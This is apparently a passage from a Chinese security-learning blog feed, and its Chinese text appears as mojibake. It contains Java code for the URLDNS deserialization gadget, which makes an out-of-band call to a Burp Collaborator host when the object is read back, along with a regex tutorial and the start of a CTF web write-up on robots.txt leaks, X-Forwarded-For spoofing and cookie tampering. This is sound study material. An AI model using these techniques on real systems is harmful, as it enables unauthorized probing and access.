class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚</span></span><br><span class="line">        <span class="comment">// é€šè¿‡javaåå°„</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        <span class="comment">// hashcodeæ”¹æˆ-1</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UnserializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ï¼ˆä¸ªäººè¿˜ä¸æ˜¯ç‰¹åˆ«æ‡‚ </p>
<h4 id="ä¸‰ã€javaæ­£åˆ™åŒ¹é…"><a href="#ä¸‰ã€javaæ­£åˆ™åŒ¹é…" class="headerlink" title="ä¸‰ã€javaæ­£åˆ™åŒ¹é…"></a>ä¸‰ã€javaæ­£åˆ™åŒ¹é…</h4><p><a href="https://www.runoob.com/java/java-regular-expressions.html">èœé¸Ÿæ•™ç¨‹</a></p>
<table>
<thead>
<tr>
<th align="left">å­—ç¬¦</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\</td>
<td align="left">å°†ä¸‹ä¸€å­—ç¬¦æ ‡è®°ä¸ºç‰¹æ®Šå­—ç¬¦ã€æ–‡æœ¬ã€åå‘å¼•ç”¨æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ <strong>n</strong>åŒ¹é…å­—ç¬¦ <strong>n</strong>ã€‚<strong>\n</strong> åŒ¹é…æ¢è¡Œç¬¦ã€‚åºåˆ— <strong>\\** åŒ¹é… *<em>\*</em> ï¼Œ</strong>\(** åŒ¹é… **(**ã€‚</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† <strong>RegExp</strong> å¯¹è±¡çš„ <strong>Multiline</strong> å±æ€§ï¼Œ^ è¿˜ä¼šä¸â€\nâ€æˆ–â€\râ€ä¹‹åçš„ä½ç½®åŒ¹é…ã€‚</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾çš„ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† <strong>RegExp</strong> å¯¹è±¡çš„ <strong>Multiline</strong> å±æ€§ï¼Œ$ è¿˜ä¼šä¸â€\nâ€æˆ–â€\râ€ä¹‹å‰çš„ä½ç½®åŒ¹é…ã€‚</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">é›¶æ¬¡æˆ–å¤šæ¬¡åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œzo* åŒ¹é…â€zâ€å’Œâ€zooâ€ã€‚* ç­‰æ•ˆäº {0,}ã€‚</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">ä¸€æ¬¡æˆ–å¤šæ¬¡åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œâ€zo+â€ä¸â€zoâ€å’Œâ€zooâ€åŒ¹é…ï¼Œä½†ä¸â€zâ€ä¸åŒ¹é…ã€‚+ ç­‰æ•ˆäº {1,}ã€‚</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">é›¶æ¬¡æˆ–ä¸€æ¬¡åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–å­è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€åŒ¹é…â€doâ€æˆ–â€doesâ€ä¸­çš„â€doâ€ã€‚? ç­‰æ•ˆäº {0,1}ã€‚</td>
</tr>
<tr>
<td align="left">{<em>n</em>}</td>
<td align="left"><em>n</em> æ˜¯éè´Ÿæ•´æ•°ã€‚æ­£å¥½åŒ¹é… <em>n</em> æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{2}â€ä¸â€Bobâ€ä¸­çš„â€oâ€ä¸åŒ¹é…ï¼Œä½†ä¸â€foodâ€ä¸­çš„ä¸¤ä¸ªâ€oâ€åŒ¹é…ã€‚</td>
</tr>
<tr>
<td align="left">{<em>n</em>,}</td>
<td align="left"><em>n</em> æ˜¯éè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é… <em>n</em> æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{2,}â€ä¸åŒ¹é…â€Bobâ€ä¸­çš„â€oâ€ï¼Œè€ŒåŒ¹é…â€fooooodâ€ä¸­çš„æ‰€æœ‰ oã€‚â€o{1,}â€ç­‰æ•ˆäºâ€o+â€ã€‚â€o{0,}â€ç­‰æ•ˆäºâ€o*â€ã€‚</td>
</tr>
<tr>
<td align="left">{<em>n</em>,<em>m</em>}</td>
<td align="left"><em>m</em> å’Œ <em>n</em> æ˜¯éè´Ÿæ•´æ•°ï¼Œå…¶ä¸­ <em>n</em> &lt;= <em>m</em>ã€‚åŒ¹é…è‡³å°‘ <em>n</em> æ¬¡ï¼Œè‡³å¤š <em>m</em> æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€åŒ¹é…â€foooooodâ€ä¸­çš„å¤´ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰æ•ˆäº â€˜o?â€™ã€‚æ³¨æ„ï¼šæ‚¨ä¸èƒ½å°†ç©ºæ ¼æ’å…¥é€—å·å’Œæ•°å­—ä¹‹é—´ã€‚</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">å½“æ­¤å­—ç¬¦ç´§éšä»»ä½•å…¶ä»–é™å®šç¬¦ï¼ˆ*ã€+ã€?ã€{<em>n</em>}ã€{<em>n</em>,}ã€{<em>n</em>,<em>m</em>}ï¼‰ä¹‹åæ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯â€éè´ªå¿ƒçš„â€ã€‚â€éè´ªå¿ƒçš„â€æ¨¡å¼åŒ¹é…æœç´¢åˆ°çš„ã€å°½å¯èƒ½çŸ­çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„â€è´ªå¿ƒçš„â€æ¨¡å¼åŒ¹é…æœç´¢åˆ°çš„ã€å°½å¯èƒ½é•¿çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œåœ¨å­—ç¬¦ä¸²â€ooooâ€ä¸­ï¼Œâ€o+?â€åªåŒ¹é…å•ä¸ªâ€oâ€ï¼Œè€Œâ€o+â€åŒ¹é…æ‰€æœ‰â€oâ€ã€‚</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">åŒ¹é…é™¤â€\r\nâ€ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è‹¥è¦åŒ¹é…åŒ…æ‹¬â€\r\nâ€åœ¨å†…çš„ä»»æ„å­—ç¬¦ï¼Œè¯·ä½¿ç”¨è¯¸å¦‚â€[\s\S]â€ä¹‹ç±»çš„æ¨¡å¼ã€‚</td>
</tr>
<tr>
<td align="left">(<em>pattern</em>)</td>
<td align="left">åŒ¹é… <em>pattern</em> å¹¶æ•è·è¯¥åŒ¹é…çš„å­è¡¨è¾¾å¼ã€‚å¯ä»¥ä½¿ç”¨ <strong>$0â€¦$9</strong> å±æ€§ä»ç»“æœâ€åŒ¹é…â€é›†åˆä¸­æ£€ç´¢æ•è·çš„åŒ¹é…ã€‚è‹¥è¦åŒ¹é…æ‹¬å·å­—ç¬¦ ( )ï¼Œè¯·ä½¿ç”¨â€(â€œæˆ–è€…â€)â€œã€‚</td>
</tr>
<tr>
<td align="left">(?:<em>pattern</em>)</td>
<td align="left">åŒ¹é… <em>pattern</em> ä½†ä¸æ•è·è¯¥åŒ¹é…çš„å­è¡¨è¾¾å¼ï¼Œå³å®ƒæ˜¯ä¸€ä¸ªéæ•è·åŒ¹é…ï¼Œä¸å­˜å‚¨ä¾›ä»¥åä½¿ç”¨çš„åŒ¹é…ã€‚è¿™å¯¹äºç”¨â€orâ€å­—ç¬¦ (|) ç»„åˆæ¨¡å¼éƒ¨ä»¶çš„æƒ…å†µå¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€™industr(?:y|ies) æ˜¯æ¯” â€˜industry|industriesâ€™ æ›´ç»æµçš„è¡¨è¾¾å¼ã€‚</td>
</tr>
<tr>
<td align="left">(?=<em>pattern</em>)</td>
<td align="left">æ‰§è¡Œæ­£å‘é¢„æµ‹å…ˆè¡Œæœç´¢çš„å­è¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼åŒ¹é…å¤„äºåŒ¹é… <em>pattern</em> çš„å­—ç¬¦ä¸²çš„èµ·å§‹ç‚¹çš„å­—ç¬¦ä¸²ã€‚å®ƒæ˜¯ä¸€ä¸ªéæ•è·åŒ¹é…ï¼Œå³ä¸èƒ½æ•è·ä¾›ä»¥åä½¿ç”¨çš„åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œâ€™Windows (?=95|98|NT|2000)â€™ åŒ¹é…â€Windows 2000â€ä¸­çš„â€Windowsâ€ï¼Œä½†ä¸åŒ¹é…â€Windows 3.1â€ä¸­çš„â€Windowsâ€ã€‚é¢„æµ‹å…ˆè¡Œä¸å ç”¨å­—ç¬¦ï¼Œå³å‘ç”ŸåŒ¹é…åï¼Œä¸‹ä¸€åŒ¹é…çš„æœç´¢ç´§éšä¸Šä¸€åŒ¹é…ä¹‹åï¼Œè€Œä¸æ˜¯åœ¨ç»„æˆé¢„æµ‹å…ˆè¡Œçš„å­—ç¬¦åã€‚</td>
</tr>
<tr>
<td align="left">(?!<em>pattern</em>)</td>
<td align="left">æ‰§è¡Œåå‘é¢„æµ‹å…ˆè¡Œæœç´¢çš„å­è¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼åŒ¹é…ä¸å¤„äºåŒ¹é… <em>pattern</em> çš„å­—ç¬¦ä¸²çš„èµ·å§‹ç‚¹çš„æœç´¢å­—ç¬¦ä¸²ã€‚å®ƒæ˜¯ä¸€ä¸ªéæ•è·åŒ¹é…ï¼Œå³ä¸èƒ½æ•è·ä¾›ä»¥åä½¿ç”¨çš„åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œâ€™Windows (?!95|98|NT|2000)â€™ åŒ¹é…â€Windows 3.1â€ä¸­çš„ â€œWindowsâ€ï¼Œä½†ä¸åŒ¹é…â€Windows 2000â€ä¸­çš„â€Windowsâ€ã€‚é¢„æµ‹å…ˆè¡Œä¸å ç”¨å­—ç¬¦ï¼Œå³å‘ç”ŸåŒ¹é…åï¼Œä¸‹ä¸€åŒ¹é…çš„æœç´¢ç´§éšä¸Šä¸€åŒ¹é…ä¹‹åï¼Œè€Œä¸æ˜¯åœ¨ç»„æˆé¢„æµ‹å…ˆè¡Œçš„å­—ç¬¦åã€‚</td>
</tr>
<tr>
<td align="left"><em>x</em>|<em>y</em></td>
<td align="left">åŒ¹é… <em>x</em> æˆ– <em>y</em>ã€‚ä¾‹å¦‚ï¼Œâ€™z|foodâ€™ åŒ¹é…â€zâ€æˆ–â€foodâ€ã€‚â€™(z|f)oodâ€™ åŒ¹é…â€zoodâ€æˆ–â€foodâ€ã€‚</td>
</tr>
<tr>
<td align="left">[<em>xyz</em>]</td>
<td align="left">å­—ç¬¦é›†ã€‚åŒ¹é…åŒ…å«çš„ä»»ä¸€å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€[abc]â€åŒ¹é…â€plainâ€ä¸­çš„â€aâ€ã€‚</td>
</tr>
<tr>
<td align="left">[^<em>xyz</em>]</td>
<td align="left">åå‘å­—ç¬¦é›†ã€‚åŒ¹é…æœªåŒ…å«çš„ä»»ä½•å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€[^abc]â€åŒ¹é…â€plainâ€ä¸­â€pâ€ï¼Œâ€lâ€ï¼Œâ€iâ€ï¼Œâ€nâ€ã€‚</td>
</tr>
<tr>
<td align="left">[<em>a-z</em>]</td>
<td align="left">å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»ä½•å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€[a-z]â€åŒ¹é…â€aâ€åˆ°â€zâ€èŒƒå›´å†…çš„ä»»ä½•å°å†™å­—æ¯ã€‚</td>
</tr>
<tr>
<td align="left">[^<em>a-z</em>]</td>
<td align="left">åå‘èŒƒå›´å­—ç¬¦ã€‚åŒ¹é…ä¸åœ¨æŒ‡å®šçš„èŒƒå›´å†…çš„ä»»ä½•å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€[^a-z]â€åŒ¹é…ä»»ä½•ä¸åœ¨â€aâ€åˆ°â€zâ€èŒƒå›´å†…çš„ä»»ä½•å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">åŒ¹é…ä¸€ä¸ªå­—è¾¹ç•Œï¼Œå³å­—ä¸ç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œâ€er\bâ€åŒ¹é…â€neverâ€ä¸­çš„â€erâ€ï¼Œä½†ä¸åŒ¹é…â€verbâ€ä¸­çš„â€erâ€ã€‚</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">éå­—è¾¹ç•ŒåŒ¹é…ã€‚â€er\Bâ€åŒ¹é…â€verbâ€ä¸­çš„â€erâ€ï¼Œä½†ä¸åŒ¹é…â€neverâ€ä¸­çš„â€erâ€ã€‚</td>
</tr>
<tr>
<td align="left">\c<em>x</em></td>
<td align="left">åŒ¹é… <em>x</em> æŒ‡ç¤ºçš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cM åŒ¹é… Control-M æˆ–å›è½¦ç¬¦ã€‚<em>x</em> çš„å€¼å¿…é¡»åœ¨ A-Z æˆ– a-z ä¹‹é—´ã€‚å¦‚æœä¸æ˜¯è¿™æ ·ï¼Œåˆ™å‡å®š c å°±æ˜¯â€câ€å­—ç¬¦æœ¬èº«ã€‚</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">æ•°å­—å­—ç¬¦åŒ¹é…ã€‚ç­‰æ•ˆäº [0-9]ã€‚</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">éæ•°å­—å­—ç¬¦åŒ¹é…ã€‚ç­‰æ•ˆäº [^0-9]ã€‚</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">æ¢é¡µç¬¦åŒ¹é…ã€‚ç­‰æ•ˆäº \x0c å’Œ \cLã€‚</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">æ¢è¡Œç¬¦åŒ¹é…ã€‚ç­‰æ•ˆäº \x0a å’Œ \cJã€‚</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰æ•ˆäº \x0d å’Œ \cMã€‚</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ã€‚ä¸ [ \f\n\r\t\v] ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ä¸ [^ \f\n\r\t\v] ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">åˆ¶è¡¨ç¬¦åŒ¹é…ã€‚ä¸ \x09 å’Œ \cI ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">å‚ç›´åˆ¶è¡¨ç¬¦åŒ¹é…ã€‚ä¸ \x0b å’Œ \cK ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">åŒ¹é…ä»»ä½•å­—ç±»å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸‹åˆ’çº¿ã€‚ä¸â€[A-Za-z0-9_]â€ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">ä¸ä»»ä½•éå•è¯å­—ç¬¦åŒ¹é…ã€‚ä¸â€[^A-Za-z0-9_]â€ç­‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">\x<em>n</em></td>
<td align="left">åŒ¹é… <em>n</em>ï¼Œæ­¤å¤„çš„ <em>n</em> æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶è½¬ä¹‰ç ã€‚åå…­è¿›åˆ¶è½¬ä¹‰ç å¿…é¡»æ­£å¥½æ˜¯ä¸¤ä½æ•°é•¿ã€‚ä¾‹å¦‚ï¼Œâ€\x41â€åŒ¹é…â€Aâ€ã€‚â€\x041â€ä¸â€\x04â€&amp;â€1â€ç­‰æ•ˆã€‚å…è®¸åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ä½¿ç”¨ ASCII ä»£ç ã€‚</td>
</tr>
<tr>
<td align="left">*num*</td>
<td align="left">åŒ¹é… <em>num</em>ï¼Œæ­¤å¤„çš„ <em>num</em> æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚åˆ°æ•è·åŒ¹é…çš„åå‘å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€(.)\1â€åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="left">*n*</td>
<td align="left">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç æˆ–åå‘å¼•ç”¨ã€‚å¦‚æœ *n* å‰é¢è‡³å°‘æœ‰ <em>n</em> ä¸ªæ•è·å­è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆ <em>n</em> æ˜¯åå‘å¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ <em>n</em> æ˜¯å…«è¿›åˆ¶æ•° (0-7)ï¼Œé‚£ä¹ˆ <em>n</em> æ˜¯å…«è¿›åˆ¶è½¬ä¹‰ç ã€‚</td>
</tr>
<tr>
<td align="left">*nm*</td>
<td align="left">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç æˆ–åå‘å¼•ç”¨ã€‚å¦‚æœ *nm* å‰é¢è‡³å°‘æœ‰ <em>nm</em> ä¸ªæ•è·å­è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆ <em>nm</em> æ˜¯åå‘å¼•ç”¨ã€‚å¦‚æœ *nm* å‰é¢è‡³å°‘æœ‰ <em>n</em> ä¸ªæ•è·ï¼Œåˆ™ <em>n</em> æ˜¯åå‘å¼•ç”¨ï¼Œåé¢è·Ÿæœ‰å­—ç¬¦ <em>m</em>ã€‚å¦‚æœä¸¤ç§å‰é¢çš„æƒ…å†µéƒ½ä¸å­˜åœ¨ï¼Œåˆ™ *nm* åŒ¹é…å…«è¿›åˆ¶å€¼ <em>nm</em>ï¼Œå…¶ä¸­ <em>n</em> å’Œ <em>m</em> æ˜¯å…«è¿›åˆ¶æ•°å­— (0-7)ã€‚</td>
</tr>
<tr>
<td align="left">\nml</td>
<td align="left">å½“ <em>n</em> æ˜¯å…«è¿›åˆ¶æ•° (0-3)ï¼Œ<em>m</em> å’Œ <em>l</em> æ˜¯å…«è¿›åˆ¶æ•° (0-7) æ—¶ï¼ŒåŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰ç  <em>nml</em>ã€‚</td>
</tr>
<tr>
<td align="left">\u<em>n</em></td>
<td align="left">åŒ¹é… <em>n</em>ï¼Œå…¶ä¸­ <em>n</em> æ˜¯ä»¥å››ä½åå…­è¿›åˆ¶æ•°è¡¨ç¤ºçš„ Unicode å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\u00A9 åŒ¹é…ç‰ˆæƒç¬¦å· (Â©)ã€‚</td>
</tr>
</tbody></table>
<h5 id="Pattern-Matcher"><a href="#Pattern-Matcher" class="headerlink" title="Pattern Matcher"></a>Pattern Matcher</h5><blockquote>
<p>Pattern.matches()</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.matches</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">boolean</span> res = Pattern.matches(<span class="string">&quot;a|m|e|u|u&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pattern + Matcher</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.compile (matcher) + Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String data[] = &#123;<span class="string">&quot;[0-9]&#123;11&#125;&quot;</span>,<span class="string">&quot;[0-9]&#123;4&#125;\\.[0-9]&#123;1,2&#125;\\.[0-9]&#123;1,2&#125;&quot;</span>&#125;;</span><br><span class="line">       </span><br><span class="line">        Pattern r = Pattern.compile(data[<span class="number">1</span>]);</span><br><span class="line">        Matcher ans = r.matcher(<span class="string">&quot;2001.1.2&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(ans.find())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;group:&quot;</span>+ans.group()); <span class="comment">// 2001.1.2</span></span><br><span class="line">            System.out.println(<span class="string">&quot;start:&quot;</span>+ans.start()); <span class="comment">// 0</span></span><br><span class="line">            System.out.println(<span class="string">&quot;end:&quot;</span>+ans.end()); <span class="comment">// 8</span></span><br><span class="line">            System.out.println(<span class="string">&quot;matches:&quot;</span>+ans.matches()); <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;lookingAt:&quot;</span>+ans.lookingAt()); <span class="comment">// true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String input = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">        Pattern p = Pattern.compile(input);</span><br><span class="line">        Matcher m = p.matcher(<span class="string">&quot;catcatcatcatcatcatcatdogcatcatcatdog&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(m.find())&#123;</span><br><span class="line">            input = m.replaceAll(<span class="string">&quot;fish&quot;</span>);</span><br><span class="line">            System.out.println(input); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatfish</span></span><br><span class="line">            input = m.replaceFirst(<span class="string">&quot;fish&quot;</span>); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatdog</span></span><br><span class="line">            System.out.println(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>javaåå°„</tag>
      </tags>
  </entry>
  <entry>
    <title>n3ctf_web_wp</title>
    <url>/2022/01/21/n3ctf-wp/</url>
    <content><![CDATA[<h5 id="00-F12"><a href="#00-F12" class="headerlink" title="00-F12"></a>00-F12</h5><p>ç­¾åˆ°ï¼ŒF12çœ‹jsæºç ï¼ŒæŸ¥æ‰¾flagå°±å¯ä»¥æ‰¾åˆ°äº†</p>
<h5 id="01-headers"><a href="#01-headers" class="headerlink" title="01-headers"></a>01-headers</h5><p>ï¼ˆèµ›åå¤ç°çš„ æ‰“å‡ºæ¥ä¹‹åçœŸçš„è§‰å¾—è‡ªå·±è¿˜æ˜¯å¤ªèœäº†</p>
<p>è¿™é“é¢˜å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼Œç®€å•çš„<code>robots.txt</code>ï¼ˆå“</p>
<p>ç„¶åè¿›å…¥<code>ydswantmanygfs.php</code>ï¼Œç›´æ¥è¯´<code>You are not from yoshino-s.online</code>ï¼Œé‚£ä¹ˆç›´æ¥æŠ“åŒ…å§</p>
<p>å¯ä»¥åœ¨å¤´ä¿¡æ¯ä¸­å‘ç°ä¸€ä¸ªhintï¼š<code> How to get remote ip</code></p>
<p>å…ˆè¯•ç€ç”¨XFFä¼ <code>yoshino-s.online</code>ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰æ”¹å˜ï¼Œé‚£ä¹ˆè¯´æ˜ç°åœ¨å°±è¦åˆ©ç”¨hintï¼Œremote ipä¹Ÿå°±æ˜¯å‘å‡ºè¯·æ±‚çš„ä¸»æœºipï¼Œé‚£ä¹ˆpingä¸€ä¸‹å§</p>
<p><img src="https://img-blog.csdnimg.cn/809c88f292764c74b9f624287d05aa16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>XFFæ¢æˆ<code>47.116.142.11</code>å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<span id="more"></span>

<h5 id="02-cookies"><a href="#02-cookies" class="headerlink" title="02-cookies"></a>02-cookies</h5><p>ç©äº†ä¸€ä¼šä¹‹åå¯ä»¥å‘ç°cookieé‡Œé¢æœ‰scoreçš„å€¼</p>
